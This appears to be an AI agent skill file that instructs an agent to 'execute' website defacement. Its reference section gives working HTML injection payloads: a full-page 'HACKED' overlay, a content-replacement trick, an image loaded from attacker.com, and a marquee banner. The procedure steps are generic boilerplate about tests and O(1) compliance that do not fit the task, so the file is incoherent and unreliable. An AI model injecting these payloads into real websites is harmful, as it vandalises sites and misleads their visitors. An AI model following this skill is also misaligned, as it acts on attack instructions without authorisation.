---
name: phase-6-defacement-payloads
description: Use when executing phase 6 defacement payloads protocols within the security sector.
---

# Phase 6 Defacement Payloads: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 6 Defacement Payloads. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 6 defacement payloads logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Phase 6: Defacement Payloads

Website appearance manipulation:

```html
<!-- Full page overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- Content replacement -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- Image injection -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Marquee injection (visible movement) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```